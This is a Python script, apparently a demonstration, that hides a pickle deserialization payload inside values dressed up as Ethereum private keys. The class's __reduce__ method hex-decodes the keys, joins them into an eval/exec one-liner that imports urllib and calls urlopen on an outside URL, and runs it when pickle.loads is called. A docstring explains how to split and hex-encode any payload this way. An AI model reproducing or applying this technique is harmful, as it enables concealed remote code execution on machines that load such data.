import eth_keys, eth_utils, binascii, os, pickle

class PrivateKeys():
    def __init__(self, priv_key_1, priv_key_2, priv_key_3, priv_key_4):
        self.priv_key_1 = priv_key_1
        self.priv_key_2 = priv_key_2
        self.priv_key_3 = priv_key_3
        self.priv_key_4 = priv_key_4
    
    def __reduce__(self):
        # the `or` is being used as a little trick to be able to send the whole payload as a one-liner
        # eval("exec('import urllib.request') or urllib.request.urlopen('https://ethereumargentina.xyz/api/count')")
        key_1 = binascii.unhexlify(self.priv_key_1)
        key_2 = binascii.unhexlify(self.priv_key_2)
        # key_3[:6] is the last char of the payload 
        key_3 = binascii.unhexlify(self.priv_key_3)
        key_4 = binascii.unhexlify(self.priv_key_4)

        return (eval, (key_1 + key_2 + key_3 + key_4[:10],))
    
    def __str__(self):
        return f"{self.priv_key_1}\n{self.priv_key_2}\n{self.priv_key_3}\n{self.priv_key_4}"
  

"""
Para crear las private keys 
>>> a = b'eval("exec(\'import urllib.request\') or urllib.request.urlopen(\'https://ethereumargentina.xyz/api/count\')")'
>>> a
b'eval("exec(\'import urllib.request\') or urllib.request.urlopen(\'https://ethereumargentina.xyz/api/count\')")'
>>> [a[i:i+32] for i in range(0, len(a), 32)]
[b'eval("exec(\'import urllib.reques', b"t') or urllib.request.urlopen('h", b'ttps://ethereumargentina.xyz/api', b'/count\')")']
>>> c = [a[i:i+32] for i in range(0, len(a), 32)]
>>> c
[b'eval("exec(\'import urllib.reques', b"t') or urllib.request.urlopen('h", b'ttps://ethereumargentina.xyz/api', b'/count\')")']
>>> for x in c:
...     print(binascii.hexlify(x))
...
b'6576616c2822657865632827696d706f72742075726c6c69622e726571756573'
b'742729206f722075726c6c69622e726571756573742e75726c6f70656e282768'
b'747470733a2f2f657468657265756d617267656e74696e612e78797a2f617069'
b'2f636f756e7427292229'
Paddear la ultima con data random y modificar el return del __reduce__ para que justo sea el final del comando.
"""

priv_key_1 = eth_keys.keys.PrivateKey(binascii.unhexlify('6576616c2822657865632827696d706f72742075726c6c69622e726571756573'))
priv_key_2 = eth_keys.keys.PrivateKey(binascii.unhexlify('742729206f722075726c6c69622e726571756573742e75726c6f70656e282768'))
priv_key_3 = eth_keys.keys.PrivateKey(binascii.unhexlify('747470733a2f2f657468657265756d617267656e74696e612e78797a2f617069'))
priv_key_4 = eth_keys.keys.PrivateKey(binascii.unhexlify('2f636f756e7427292229c6962222967656e74696e612e78797a2f617069d706a'))


priv_keys = PrivateKeys('6576616c2822657865632827696d706f72742075726c6c69622e726571756573', '742729206f722075726c6c69622e726571756573742e75726c6f70656e282768', '747470733a2f2f657468657265756d617267656e74696e612e78797a2f617069',
'2f636f756e7427292229c6962222967656e74696e612e78797a2f617069d706a')

pubKey = priv_key_1.public_key

priv = pickle.dumps(priv_keys)

try:
    pickle.loads(priv)
except:
    pass

print(f"{priv_keys}")

